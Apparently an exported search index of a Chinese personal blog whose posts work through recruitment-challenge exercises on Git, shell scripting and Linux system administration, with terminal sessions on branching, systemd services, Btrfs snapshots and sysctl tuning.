登录的时候遇到问题，发现得要用 Personal Access Token 来代替 Password，然后保存一下登录：\n1 2 3 4 # 配置凭据缓存（默认缓存15分钟） git config --global credential.helper cache # 可选：设置缓存时间（单位：秒，例如设置30天） git config --global credential.helper \u0026#39;cache --timeout=2592000\u0026#39; 同步操作：\n使用 git pull 命令从远程仓库拉取最新的变更。 使用 git push 命令将你的本地提交推送到远程仓库。 1 2 3 4 5 6 7 [root@localhost learning_log]# git push ...... Username for \u0026#39;https://github.com\u0026#39;: calendar0917 Password for \u0026#39;https://calendar0917@github.com\u0026#39;: ...... remote: To https://github.com/calendar0917/learning_log.git 1d476d9..5a31feb main -\u0026gt; main 验证：在远程仓库页面上，确认你的提交历史已成功显示。\n分支管理 目标：理解分支的作用，掌握创建、切换和合并分支的操作。 在一个分支上进行的代码修改不会影响其他分支，进行实验性的开发，能回退到原来的状态。\n挑战：\n创建一个名为 feature-a 的新分支。 git branch name 新建分支\ngit checkout name 跳转分支\ngit checkout -b name 创建并跳转分支\n在新分支上对文件进行修改并提交。 1 2 3 4 5 6 7 8 [root@localhost learning_log]# git branch feature-a [root@localhost learning_log]# git checkout feature-a Switched to branch \u0026#39;feature-a\u0026#39; [root@localhost learning_log]# vi hello.txt [root@localhost learning_log]# git add hello.txt [root@localhost learning_log]# git commit -m \u0026#34;来自feature-a的修改\u0026#34; [feature-a 44b4133] 来自feature-a的修改 1 file changed, 1 insertion(+) 切换回主分支（main 或 master）。 使用 git merge 命令将 feature-a 分支的修改合并到主分支上。 删除 feature-a 分支。 1 2 3 4 5 6 7 8 9 10 11 12 [root@localhost learning_log]# git branch * feature-a main [root@localhost learning_log]# git checkout main Switched to branch \u0026#39;main\u0026#39; [root@localhost learning_log]# git merge feature-a Updating 5a31feb..44b4133 Fast-forward hello.txt | 1 + 1 file changed, 1 insertion(+) [root@localhost learning_log]# git branch -d feature-a Deleted branch feature-a (was 44b4133). 历史记录与回溯 目标：学会查看提交历史，并在需要时回溯到特定版本。\n挑战：\n使用 git log 命令查看你的提交历史。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost learning_log]# git log commit 44b413353e383dcbc0063558f1ce87e544c7730b Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:54:50 2025 -0700 来自feature-a的修改 commit 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:38:50 2025 -0700 测试暂存与提交 commit 1d476d982a3144004612cc9162b83b6483e42faa Author: calendar0917 \u0026lt;1131821081@qq.com\u0026gt; Date: Thu Feb 13 11:10:55 2025 +0800 Initial commit 找到一个较早的提交 ID。 使用 git reset 或 git revert 命令将代码库回溯到该提交版本，并解释你所用命令的区别。 知识：\n工作区和暂存区： 工作区：可见的实际存放项目文件的目录 暂存区：一个临时保存文件修改的区域，它是位于 .git 目录中的一个文件（在.git/index） ，并不是一个实际可视化的文件夹。Git 利用暂存区来管理文件的状态，决定哪些文件的修改会被包含在下一次提交中。 使用 git add 命令后，工作区中已修改的文件会被添加到暂存区，文件进入已暂存状态。暂存区只记录那些即将被提交到版本库的文件修改信息 。 git revert: 原理是创建一个新的提交，用来抵消目标提交所做的修改。（对后面的修改不影响，且不修改历史记录） git reset： 用于将当前分支的 HEAD 指针重置到指定的提交版本，同时可以选择如何处理工作区和暂存区的文件 --hard 模式：将 HEAD 指针、暂存区和工作区都重置到指定提交版本 --soft 模式：仅将 HEAD 指针重置到指定提交版本，暂存区和工作区的内容保持不变 假设你有一串零散的提交（比如修复同一个功能的多次小修改），想把它们合并成一个清晰的大提交，--soft 模式非常合适 刚执行了 git commit，但发现提交信息写错了，或者想补充修改后再提交 --mixed 模式：将 HEAD 指针和暂存区重置到指定提交版本，工作区内容不变。 实操： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 报错了，用 git status 看原因 [root@localhost learning_log]# git revert 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 error: could not revert 5a31feb... 测试暂存与提交 hint: after resolving the conflicts, mark the corrected paths hint: with \u0026#39;git add \u0026lt;paths\u0026gt;\u0026#39; or \u0026#39;git rm \u0026lt;paths\u0026gt;\u0026#39; hint: and commit the result with \u0026#39;git commit\u0026#39; [root@localhost learning_log]# git status # On branch main --\u0026gt; 所在分支、状态 # Your branch is ahead of \u0026#39;origin/main\u0026#39; by 1 commit. # (use \u0026#34;git push\u0026#34; to publish your local commits) # # You are currently reverting commit 5a31feb. --\u0026gt; 正在进行的操作 # (fix conflicts and run \u0026#34;git revert --continue\u0026#34;) # (use \u0026#34;git revert --abort\u0026#34; to cancel the revert operation) # # Unmerged paths: --\u0026gt; 报错的地方，5a31feb 中创建了 hello.txt,这里需要手动删除才可以 # (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) # (use \u0026#34;git add/rm \u0026lt;file\u0026gt;...\u0026#34; as appropriate to mark resolution) # # deleted by them: hello.txt # 手动删除 [root@localhost learning_log]# git rm hello.txt hello.txt: needs merge [root@localhost learning_log]# git revert --continue [main 49e231f] Revert \u0026#34;测试暂存与提交\u0026#34; 1 file changed, 2 deletions(-) delete mode 100644 hello.txt [root@localhost learning_log]# git push ...... 远程仓库进阶 目标：管理多个远程仓库，并实现不同仓库间的同步。 挑战： 为你的本地仓库添加第二个远程仓库（例如，一个 GitHub 仓库和一个 Gitee 仓库）。 将你的本地分支推送到这两个不同的远程仓库。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 查看并添加远程仓库 [root@localhost learning_log]# git remote -v origin https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) [root@localhost learning_log]# git remote add gitee https://gitee.com/calendar917/learning_log.git [root@localhost learning_log]# git remote -v gitee https://gitee.com/calendar917/learning_log.git (fetch) gitee https://gitee.com/calendar917/learning_log.git (push) origin https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) # push 到gitee上 [root@localhost learning_log]# git push gitee main Username for \u0026#39;https://gitee.com\u0026#39;: calendar917 Password for \u0026#39;https://calendar917@gitee.com\u0026#39;: Counting objects: 10, done. ...... To https://gitee.com/calendar917/learning_log.git * [new branch] main -\u0026gt; main ","date":"2025-10-18T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/","title":"御林招新题：Git 版本管理"},{"content":"重定向与管道 了解标准输入、标准输出、标准错误的概念。 标准输入（Standard Input，stdin）：默认是键盘，是程序获取输入数据的地方。例如，cat命令如果没有指定文件，就会从标准输入读取内容，此时你可以在键盘上输入文字，输入结束后按Ctrl + D（类 Unix 系统）表示输入结束，cat会将输入的内容输出。 标准输出（Standard Output，stdout）：默认是终端屏幕，是程序输出正常结果的地方。比如执行ls命令，会在终端显示当前目录下的文件和文件夹列表。 标准错误（Standard Error，stderr）：默认也是终端屏幕，用于输出程序的错误信息。例如，执行ls /nonexistent（假设/nonexistent是不存在的目录），会在终端显示类似ls: cannot access '/nonexistent': No such file or directory的错误信息，这就是标准错误输出。 使用 \u0026gt; 和 \u0026gt;\u0026gt; 操作符将命令的输出重定向到文件。 \u0026gt;操作符：用于将命令的标准输出重定向到文件，如果文件已存在，会覆盖文件原有内容；如果文件不存在，会创建新文件。 \u0026gt;\u0026gt;操作符：用于将命令的标准输出以追加的方式重定向到文件，即把输出内容添加到文件原有内容的末尾，不会覆盖原有内容。 使用 2\u0026gt; 或 2\u0026gt;\u0026gt; 操作符将标准错误重定向到文件。 1 2 3 4 5 [root@localhost hello]# ls /invalid 2\u0026gt; error.txt [root@localhost hello]# ls /invalid_2 2\u0026gt;\u0026gt; error.txt [root@localhost hello]# cat error.txt ls: cannot access /invalid: No such file or directory ls: cannot access /invalid_2: No such file or directory 使用 | 管道操作符将一个命令的输出作为另一个命令的输入。 1 2 3 [root@localhost hello]# ls | grep \u0026#39;txt\u0026#39; digit_count.txt error.txt 变量与引号 学习如何在 Shell 中定义、引用和取消定义变量。 定义变量：基本语法是：变量名=值，等号两边不能有空格。\n引用变量：使用 $变量名 或者 ${变量名} 的形式。\n取消定义变量\n使用 unset 命令可以取消定义变量，语法为：unset 变量名。\n理解单引号 (')、双引号 (\u0026quot;) 和反引号 (``) 的区别与作用。 单引号（'）：用于包裹字符串，单引号内的所有内容都被视为普通字符，不会进行变量替换、命令替换等操作。\n**双引号（\u0026quot;）：**双引号内会进行变量替换和命令替换（需要结合$()或反引号）\n**反引号（`）**：反引号主要用于命令替换，即执行反引号内的命令，并将命令的输出作为结果返回。不过现在更推荐使用$()`来进行命令替换，因为它的可读性更好，而且可以嵌套使用（反引号嵌套使用比较复杂）。\n参数与条件判断 了解如何获取命令行参数（例如 $1, $2, $#）。 $1、$2、$3……：分别表示第 1 个、第 2 个、第 3 个…… 命令行参数。 $#：表示命令行参数的个数。 $0：表示脚本本身的名称。 $\\*：把所有的命令行参数当作一个整体的字符串 $@：把每个命令行参数当作独立的字符串 掌握基本的条件判断语句（if 语句）。 1 2 3 4 5 6 7 if [条件1]; then # 条件1为真时执行的命令 elif [条件2]; then # 条件2为真时执行的命令 else # 所有条件都为假时执行的命令 fi 使用 test 或 [] 进行文件、字符串或数字的比较。 test 命令和 []（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。[] 是 test 命令的另一种写法，使用起来更简洁。\n文件： -e 存在、-f 普通文件、-d 目录、-r 可读、-w 可写、-x 可执行 字符串： = 相等、！=不等、-z 长度是否为0、-n 长度是否不为零 数字： -eq 相等、-ne 不相等、-gt 大于、-ge 大于等于、-lt 小于、-le 小于等于 循环 学习 for 循环和 while 循环的基本用法。 1 2 3 4 5 6 7 for 变量 in 元素1 元素2 元素3 ...; do # 循环体，对每个元素执行的操作 done for 变量 in {起始值..结束值}; do # 循环体 done 1 2 3 while 条件; do # 循环体，条件为真时执行的操作 done 能够编写简单的循环脚本来处理文件列表或执行重复任务。 编写一个 Shell 脚本，实现以下功能： 参数检查：\n检查脚本是否接收到至少一个命令行参数。如果没有，打印使用说明（例如：Usage: ./file_processor.sh \u0026lt;directory\u0026gt;）并退出。 目录遍历：\n脚本接收一个目录路径作为参数。进入该目录后，使用 for 循环遍历目录下的所有文件。 文件处理：\n对于遍历到的每一个文件，进行以下判断：\n如果文件是普通文件（非目录），则将该文件的文件名（不包含路径）打印到标准输出。\n如果文件是可执行文件，则在文件名后面追加 (Executable) 字样。\n结果输出：\n将所有被处理的文件的输出结果（包含可执行标记）重定向到一个名为 processed_files.txt 的新文件中。\n最后，打印一句话，提示用户处理已完成，并说明结果已保存在 processed_files.txt 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/bin/bash # 判断是否未传入任何参数 if [ -z \u0026#34;$*\u0026#34; ]; then echo \u0026#39;Usage： ./file_processor.sh \u0026lt;directory\u0026gt;\u0026#39; echo \u0026#39;是不是没有写文件路径？\u0026#39; # 判断传入的参数是否为目录 elif [ -d \u0026#34;$1\u0026#34; ]; then # 遍历目录下的所有文件 for file in \u0026#34;$1\u0026#34;/*; do # 判断是否为普通文件 if [ -f \u0026#34;$file\u0026#34; ]; then echo -n \u0026#34;$file\u0026#34; echo -n \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; processed_files.txt # 判断文件是否可执行 if [ -x \u0026#34;$file\u0026#34; ]; then echo -n \u0026#39;Executable\u0026#39; echo -n \u0026#39;Executable\u0026#39; \u0026gt;\u0026gt; processed_files.txt fi fi echo \u0026#39;\u0026#39; # 美化的作用 done echo \u0026#39;批处理已完成，结果已保存在 processed_files.txt 中\u0026#39; echo \u0026#39;-----------------\u0026#39; else echo \u0026#39;是不是文件夹路径输错了？\u0026#39; fi 写错的点：\n[ -z $* ]，要先写 -\u0026lt;...\u0026gt; $file 忘记改单引号为双引号了 $1 只是目录路径，\u0026quot;$1\u0026quot;/* 才是目录下所有文件 echo 默认带换行，添加 -n 参数取消 结果如下图：\n又发现 .txt 中没有换行，得添加一下手动换行\n","date":"2025-10-18T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/","title":"御林招新题：shell 入门"},{"content":"小结 ps 命令查看进程 losf、netstat 查看端口进程号 kill 终结进程 Linux 文件结构 grep + 正则 + 管道查找指定内容 wc 统计字符 自动化脚本 .sh systemctl 控制 service 终止 内核模块 lsmod 列出 modprobe 控制 btrfs 控制磁盘、分卷 mount 挂载 snapshot 创建快照、回滚 journalctl 查看、删除日志文件 sysctl 查看、修改内核参数 控制 TCP 最大连接数：net.core.somaxconn \u0026amp; net.ipv4.tcp_max_syn_backlog 系统与进程管理 特殊进程：描述进程号为 1 的特殊进程是什么，以及它在系统中的作用。 进程号为 1 的特殊进程在类 Unix 系统（如 Linux）中通常是init进程\n作用：它是系统启动后创建的第一个用户空间进程，是所有其他进程的祖先进程。负责系统初始化，比如启动各种服务、设置运行级别等，系统关闭时也由它来完成相关收尾工作，确保系统各部分有序启动和停止。 由 0 进程创建，内核启动 -\u0026gt; init启动 -\u0026gt; 启动其他进程 进程状态：使用 ps 命令查看所有活跃进程，并分析其父子关系。 1 2 3 4 5 [root@localhost ~]# ps -A -f UID PID PPID C STIME TTY TIME CMD root 1 0 0 23:25 ? 00:00:03 /usr/lib/systemd/systemd --switched-root --syste root 2 0 0 23:25 ? 00:00:00 [kthreadd] root 4 2 0 23:25 ? 00:00:00 [kworker/0:0H] PID：进程 ID\nPPID：进程的父 PID\n端口占用：当某个程序无法启动并提示端口已被占用时，如何通过命令行找出占用该端口的进程号（PID）并终止它。 查看端口进程：\nlsof（List Open Files ） netstat（Network Statistics） netstat | grep PID -t：显示 TCP 协议的连接 / 端口（Transmission Control Protocol，传输控制协议）。 -u：显示 UDP 协议的连接 / 端口（User Datagram Protocol，用户数据报协议）。 -l：仅显示 处于监听状态 的端口（即等待外部连接的端口，而非已建立的连接）。 -p：显示 占用端口的进程信息（包括进程 ID 和进程名），需要 root 权限才能完整显示。 -n：以 数字形式 显示 IP 地址和端口号（而非域名或服务名，例如直接显示 127.0.0.1:8080 而非 localhost:http-alt）。 终止：\nkill -pid PID 强制终止进程 网络与文件系统 文件系统结构：描述 Linux 文件系统（例如 ext4）的基本目录结构和作用，并解释根目录 / 和 /home 的区别。 基本目录结构：树形\n/（根目录）：最顶层目录，所有其他目录和文件都从这里开始分支，包含了系统运行所需的所有核心文件和目录，一般情况下普通用户只能读取 /home：是普通用户的主目录集合，每个普通用户在系统中都有一个以自己用户名命名的子目录（如用户 user1 的主目录是 /home/user1）。用户在自己的主目录下有完全的操作权限，可以存储个人文件、配置个人环境等，不会影响系统的核心部分。 /bin：存放系统的基本命令，这些命令是二进制可执行文件，普通用户和超级用户都可以执行，用于完成基本的系统操作，如 ls（列出目录内容）、cp（复制文件）等。 /sbin：存放系统管理命令，通常只有超级用户（root）才能执行，用于系统管理和维护，如 ifconfig（配置网络接口）、shutdown（关闭系统）等。 /etc：存放系统的配置文件，包括系统服务配置、用户配置、网络配置等，如 passwd（用户账户信息）、fstab（文件系统挂载配置）等。 /dev：存放设备文件，Linux 把所有的硬件设备都抽象为文件，通过这些文件可以访问和控制硬件设备，如 sda（第一块硬盘）、tty1（第一个终端）等。 /proc：是一个虚拟文件系统，它不占用实际的磁盘空间，而是反映系统当前的运行状态，包含了进程信息、内存使用情况等，如 /proc/cpuinfo（CPU 信息）、/proc/meminfo（内存信息）等。 /usr：存放用户安装的应用程序和文件，类似于 Windows 系统中的 “Program Files” 目录，包含了大量的应用程序、库文件、文档等。 /var：存放经常变化的文件，如日志文件（/var/log）、邮件（/var/mail）、打印队列（/var/spool）等。 /tmp：存放临时文件，系统重启后这里的文件会被清除，用于程序运行时临时存储数据。 GRUB：什么是 GRUB？它在 Linux 系统启动中扮演了什么角色？ Grand Unified Bootloader 统一引导加载程序\n系统启动引导：计算机开机后，首先由 BIOS（基本输入输出系统）或 UEFI（统一可扩展固件接口）进行硬件检测和初始化，然后会将引导加载程序（GRUB）加载到内存中运行。GRUB 负责加载 Linux 内核，并将系统控制权转交给内核，从而启动 Linux 系统。 多系统引导：如果计算机上安装了多个操作系统（如同时安装了 Linux 和 Windows），GRUB 可以提供一个启动菜单，让用户选择要启动的操作系统。 内核参数设置：在系统启动时，用户可以通过 GRUB 的启动菜单，临时修改内核的启动参数，这对于系统调试、故障排除（如单用户模式启动）等非常有用。 文件内容处理 查找模式：使用 grep 命令在 /etc/passwd 文件中，找出所有以 t 开头的文本行。 1 2 3 [root@localhost ~]# grep \u0026#39;^t\u0026#39; /etc/passwd tss:x:59:59:Account used ...... tcpdump:x:72:72::/:/sbin/nologin 管道与重定向：使用管道和重定向，将 /etc/passwd 文件中所有包含数字的行数统计出来，并重定向到一个名为 digit_count.txt 的文件中。 1 2 3 [root@localhost ~]# grep -E [0-9] /etc/passwd | wc -l \u0026gt; hello/digit_count.txt // 统计结果：44 高级系统管理 systemd：\n编写一个简单的 systemd service 文件，让一个简单的脚本（例如，一个每分钟向 /tmp/test_log.txt 文件写入当前时间的脚本）开机自启动。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //time.sh #!/bin/bash while true; do echo \u0026#34;当前时间: $(date)\u0026#34; \u0026gt;\u0026gt; /tmp/test_log.txt sleep 60 done //service [Unit] Description=定时写入时间到日志的服务 [Service] ExecStart=/home/your_username/time_script.sh Restart=always [Install] WantedBy=multi-user.target 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost ~]# sudo systemctl enable time-logger.service Created symlink from /etc/systemd/system/multi-user.target.wants/time-logger.service to /etc/syste md/system/time-logger.service. [root@localhost ~]# systemctl start time-logger.service [root@localhost ~]# systemctl status time-logger.service ● time-logger.service - 定时写入时间到日志的服务 Loaded: loaded (/etc/systemd/system/time-logger.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2025-10-17 00:48:53 PDT; 2s ago Main PID: 29493 (time_script.sh) Tasks: 2 Memory: 304.0K CGroup: /system.slice/time-logger.service ├─29493 /bin/bash /root/time_script.sh └─29497 sleep 60 [root@localhost ~]# cat /tmp/test_log.txt 当前时间: Fri Oct 17 00:48:53 PDT 2025 使用 systemctl 命令启用和启动你的服务，并验证它是否正常工作。 内核模块：\n列出系统中所有已加载的内核模块。 1 2 3 4 5 [root@localhost ~]# lsmod Module Size Used by nf_conntrack_netlink 36396 0 xt_addrtype 12676 2 ..... 尝试加载一个你了解的内核模块（例如，一个虚拟网络设备模块），然后卸载它，并验证其状态。 1 2 3 4 5 6 [root@localhost ~]# modprobe dummy [root@localhost ~]# lsmod | grep dummy dummy 12960 0 [root@localhost ~]# modprobe -r dummy [root@localhost ~]# lsmod | grep dummy [root@localhost ~]# 什么是 dummy？\n在 Linux 系统中，dummy模块是一种虚拟网络设备模块，主要有以下特点和用途：\n虚拟网络接口创建：加载dummy模块后，通过系统命令可以创建出像 dummy0、dummy1 这样的虚拟网络接口。这些接口和真实的物理网络接口类似， 可以配置 IP 地址、子网掩码等网络参数 ，也能参与网络数据包的收发模拟。 网络测试与实验：在进行网络相关的测试，比如路由策略测试、防火墙规则测试时，使用dummy虚拟网络接口非常方便。不需要依赖实际的物理网络设备，就可以构建复杂的网络拓扑结构，模拟各种网络环境。 服务绑定与隔离：某些应用场景下，需要将特定的网络服务绑定到指定的网络接口上，使用dummy接口可以实现灵活的绑定和隔离。比如，希望某个服务只在特定的 “网络通道” 上提供服务，就可以将该服务绑定到dummy接口上，便于管理和安全控制。 现代文件系统 Btrfs/ZFS 文件系统实践：\n创建文件系统与子卷：\n假设你有一个未使用的磁盘分区 /dev/sdb1。\n格式化该分区为 Btrfs 或 ZFS 文件系统。\n挂载该文件系统到一个新的目录，例如 /mnt/data。\n在 /mnt/data 下创建两个子卷，一个名为 web_data，另一个名为 database。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 由于没有磁盘分区，故用虚拟磁盘代替 [root@localhost ~]# dd if=/dev/zero of=~/virtual_disk.img bs=1G count=1 // 创建 1G * 1 的虚拟磁盘 [root@localhost ~]# losetup -f ~/virtual_disk.img [root@localhost ~]# losetup -a | grep virtual_disk.img /dev/loop0: [2051]:67154732 (/root/virtual_disk.img) // 自动映射,格式化 [root@localhost ~]# mkfs.btrfs /dev/loop0 btrfs-progs v4.9.1 See http://btrfs.wiki.kernel.org for more information. Performing full device TRIM /dev/loop0 (1.00GiB) ... ...... // 创建映射文件系统新目录并挂载 [root@localhost ~]# mkdir /mnt/data [root@localhost ~]# mount /dev/loop0 /mnt/data // 创建两个子卷 [root@localhost ~]# btrfs subvolume create /mnt/data/web_data Create subvolume \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume create /mnt/data/database Create subvolume \u0026#39;/mnt/data/database\u0026#39; [root@localhost ~]# btrfs subvolume list /mnt/data ID 256 gen 7 top level 5 path web_data ID 257 gen 8 top level 5 path database 快照与回滚：\n在 web_data 子卷中创建一个测试文件 hello.txt。\n为 web_data 子卷创建一个只读快照，命名为 snapshot_v1。\n修改 web_data 子卷中的 hello.txt 文件内容。\n验证 snapshot_v1 中的文件内容是否保持不变。\n回滚 web_data 子卷到 snapshot_v1 的状态，并验证 hello.txt 的内容是否恢复到修改前。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 创建文件 [root@localhost ~]# echo \u0026#39;helloworld 111\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt // 创建只读快照 [root@localhost ~]# btrfs subvolume snapshot -r /mnt/data/web_data /mnt/data/snapshot_v1 Create a readonly snapshot of \u0026#39;/mnt/data/web_data\u0026#39; in \u0026#39;/mnt/data/snapshot_v1\u0026#39; // 修改文件 [root@localhost ~]# echo \u0026#39;helloworld 222\u0026#39; \u0026gt; /mnt/data/web_data/hello.txt //读快照，并未改变 [root@localhost ~]# cat /mnt/data/snapshot_v1/hello.txt helloworld 111 // 删除源文件，快照恢复 [root@localhost ~]# btrfs subvolume delete /mnt/data/web_data Delete subvolume (no-commit): \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# btrfs subvolume snapshot /mnt/data/snapshot_v1/ /mnt/data/web_data Create a snapshot of \u0026#39;/mnt/data/snapshot_v1/\u0026#39; in \u0026#39;/mnt/data/web_data\u0026#39; [root@localhost ~]# cat /mnt/data/web_data/hello.txt helloworld 111 系统优化与维护 缓存与日志管理：\n使用 journalctl 命令查看过去 10 分钟内系统日志中所有包含“error”或“fail”关键字的条目。\n通过命令行安全地清除超过 7 天的系统日志文件，以释放磁盘空间。\n1 2 3 4 5 6 7 [root@localhost ~]# journalctl --since \u0026#34;100 minute ago\u0026#34; | grep -E \u0026#34;error|fail\u0026#34; Oct 17 00:46:03 localhost.localdomain systemd[1]: Unit time-logger.service entered failed state. Oct 17 00:46:03 localhost.localdomain systemd[1]: time-logger.service failed. ...... [root@localhost ~]# journalctl --vacuum-time=7d Vacuuming done, freed 0B of archived journals on disk. 内核参数调整：\n查看当前系统中的 TCP 最大连接数限制参数。\n临时修改该参数，将最大连接数限制提高到 50000。\n使用 sysctl -a 命令验证修改是否生效。\n1 2 3 4 5 6 7 8 9 10 [root@localhost ~]# sysctl net.core.somaxconn net.ipv4.tcp_max_syn_backlog net.core.somaxconn = 128 net.ipv4.tcp_max_syn_backlog = 256 [root@localhost ~]# sysctl -w net.core.somaxconn=50000 net.core.somaxconn = 50000 [root@localhost ~]# sysctl -a | grep -E \u0026#34;50000\u0026#34; ...... net.core.somaxconn = 50000 ...... 解释此项修改对一个高并发 Web 服务器可能带来的影响。 提高 TCP 最大连接数限制（如 net.core.somaxconn 和 net.ipv4.tcp_max_syn_backlog），对高并发 Web 服务器有以下影响：\n优化： 能够处理更多的并发 TCP 连接请求，减少因连接队列满而导致的连接建立失败情况，提升 Web 服务器的并发处理能力，让更多客户端能成功与服务器建立连接并请求资源。 问题： 会增加服务器的内存等资源消耗，因为每个连接都需要一定的内存来维护连接状态等信息。如果服务器内存等资源不足，过度提高连接数限制可能导致系统内存紧张，甚至出现内存溢出等问题，反而影响服务器的稳定运行。 ","date":"2025-10-17T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-linux%E8%BF%9B%E9%98%B6/","title":"御林招新题：Linux 进阶"},{"content":"获得一个Linux操作系统 服务器 + 云服务器均尝试，已完成。\n命令基础 登录Linux系统，更改自己的用户口令 1 2 3 4 5 [root@localhost ~]# passwd Changing password for user root. New password: Retype new password: passwd: all authentication tokens updated successfully. 执行常用的Linux命令 1 2 3 4 5 [root@localhost ~]# ls anaconda-ks.cfg original-ks.cfg [root@localhost ~]# mkdir hello [root@localhost ~]# cd .. ... 使用 man 命令，来查找特定命令的帮助信息 。 man ls 文件与目录 显示和改变当前目录 。 1 2 3 [root@localhost /]# pwd / [root@localhost /]# cd home 使用 ls 命令的不同选项来查看文件与目录的属性 。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [root@localhost /]# ls -l total 24 lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4096 Sep 28 16:34 boot drwxr-xr-x. 19 root root 3260 Oct 16 03:17 dev ...... [root@localhost /]# ls -lh total 24K lrwxrwxrwx. 1 root root 7 Sep 28 08:05 bin -\u0026gt; usr/bin dr-xr-xr-x. 5 root root 4.0K Sep 28 16:34 boot drwxr-xr-x. 19 root root 3.2K Oct 16 03:17 dev ...... [root@localhost /]# ls -t root etc tmp run dev sys proc opt boot ... [root@localhost /]# ls -a . bin dev home lib64 mnt proc run srv tmp var .. boot etc lib media opt root sbin sys usr 创建和删除目录 。 1 2 [root@localhost /]# mkdir test [root@localhost /]# rmdir test 创建零长度的文件 。\ntouch test.txt 拷贝、移动、重命名、链接及删除文件 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 [root@localhost /]# mkdir test [root@localhost /]# rmdir test [root@localhost /]# touch test.txt [root@localhost /]# cp test.txt test_cp.txt [root@localhost /]# mv test.txt text_rename.txt [root@localhost /]# ln test_cp.txt test_cp_hardlink.txt [root@localhost /]# ln -s test_cp test_cp_hardlink.txt test_cp.txt [root@localhost /]# ln -s test_rename_softlink.txt [root@localhost /]# rm test* rm: remove regular empty file ‘test_cp_hardlink.txt’? y rm: remove regular empty file ‘test_cp.txt’? y rm: remove symbolic link ‘test_rename_softlink.txt’? y 软链接：适合需要跨分区或对目录建立快捷方式的场景。 硬链接：适合在同一分区内共享文件内容且不希望因删除源文件而失效的场景。 查看文件内容 。 1 2 [root@localhost /]# cat bin cat: bin: Is a directory 修改文件和目录权限 使用长列表命令来查看文件与目录的信息 1 2 3 4 5 6 7 [root@localhost test]# mkdir test1 [root@localhost test]# touch test.txt [root@localhost test]# echo \u0026#34;hello\u0026#34; \u0026gt;\u0026gt; test.txt [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -rw-r--r--. 1 root root 6 Oct 16 03:44 test.txt -rw-r--r-- ,共 10 个字符：\n第 1 位：文件类型（- 普通文件，d 目录，l 链接）\n第 2-4 位：所有者（User）权限\n第 5-7 位：所属组（Group）权限\n第 8-10 位：其他用户（Others）权限\n权限字符：\nr (Read)：读取权限（4） w (Write)：写入权限（2） x (Execute)：执行权限（1） -：无对应权限（0） 对普通文件与目录的权限进行操作 格式：chmod [用户][操作][权限] 文件名\n用户：u(所有者)、g(所属组)、o(其他)、a(所有) 操作：+(添加)、-(移除)、=(设置) 1 2 3 4 [root@localhost test]# ls -l total 4 drwxr-xr-x. 2 root root 6 Oct 16 03:43 test1 -r--r--r--. 1 root root 6 Oct 16 03:44 test.txt vi 编辑器 创建一个文件 。vi filename\n保存并退出一个文件及不保存退出一个文件 。\n命令模式下，:wq 保存退出，:q! 直接退出\n在文本中使用不同的键进行光标的移动 。 上下左右：kjhl\n单词：w 移动到下一个单词开头；b 移动到上一个单词开头\n行首 ^，行尾 $\n文首 gg ,文尾 G\n在一个文件中加入、删除与修改文本 。 新增 光标前：i 行首I\n光标后：a 行尾A\n下一行：o 上一行O\n删除 所在字符：nx\n所在行：ndd\n到行首 d^ 到行尾 d$\n修改 当前字符：r\n到行尾：R\n设定选项以自定义编辑环境 。 :set number 设置行号\n调用命令行编辑功能 。 :!command 执行\n替换：:%s/old/new/g（old 为要替换的旧内容，new 为新内容，% 表示整个文件，g 表示全局替换）\n查找：/pattern，n下一个，N上一个\n文件操作进阶 通配符应用：在 /usr/bin 目录下，使用通配符查找所有以字母 a 开头的文件名，并仅列出文件名。 1 2 3 4 [root@localhost bin]# ls a* a2p abrt-merge-pstoreoops appstream-compose abrt-action-analyze-backtrace abrt-retrace-client appstream-util ... 查找文件：在 /tmp 目录中找到所有文件名。 1 2 [root@localhost bin]# find /tmp -type f -printf \u0026#34;%f\\n\u0026#34; .X0-lock 文件内容排序：将 /etc/passwd 文件中的内容按字母顺序和逆序分别显示。 1 2 3 4 5 6 7 8 [root@localhost tmp]# sort /etc/passwd abrt:x:173:173::/etc/abrt:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin ... [root@localhost tmp]# sort -r /etc/passwd usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:991:986:Unbound DNS resolver:/etc/unbound:/sbin/nologin ... 头部和尾部显示：显示 /etc/passwd 文件的前5行和后10行的内容。 1 2 3 4 5 6 7 8 9 [root@localhost tmp]# head -n 5 